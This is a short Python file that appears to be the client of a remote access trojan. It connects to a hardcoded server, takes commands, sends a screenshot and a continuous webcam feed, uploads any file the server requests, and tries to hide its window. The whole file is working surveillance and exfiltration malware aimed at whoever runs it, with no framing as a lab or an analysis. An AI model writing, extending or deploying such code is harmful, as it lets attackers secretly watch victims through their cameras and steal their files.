import socket
import pyautogui
import os
import time
import cv2
import numpy as np
from PyQt5.QtWidgets import QApplication, QWidget

# Client socket
CLIENT_HOST = '10.0.1.33'  # Change to the server IP
CLIENT_PORT = 9999
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def connect_to_server():
    """Connects the client to the server."""
    client_socket.connect((CLIENT_HOST, CLIENT_PORT))
    print("[+] Connected to server")
    while True:
        # Listen for incoming commands
        command = client_socket.recv(1024).decode('utf-8')
        if command.startswith("!stream"):
            start_screen_and_webcam_stream()
        elif command.startswith("!download"):
            download_file(command.split(" ")[1])

def start_screen_and_webcam_stream():
    """Streams the client's screen and webcam."""
    screen = pyautogui.screenshot()
    screen_np = np.array(screen)
    screen_bgr = cv2.cvtColor(screen_np, cv2.COLOR_RGB2BGR)
    _, screen_bytes = cv2.imencode('.png', screen_bgr)
    client_socket.sendall(screen_bytes.tobytes())

    # Webcam stream (OpenCV)
    cap = cv2.VideoCapture(0)
    while True:
        ret, frame = cap.read()
        if not ret:
            break
        _, webcam_bytes = cv2.imencode('.jpg', frame)
        client_socket.sendall(webcam_bytes.tobytes())

def download_file(filepath):
    """Handles file download command."""
    with open(filepath, 'rb') as file:
        data = file.read()
        client_socket.sendall(data)

def hide_gui():
    """Hides the client GUI window."""
    app = QApplication([])
    window = QWidget()
    window.hide()
    app.exec_()

if __name__ == "__main__":
    hide_gui()
    connect_to_server()
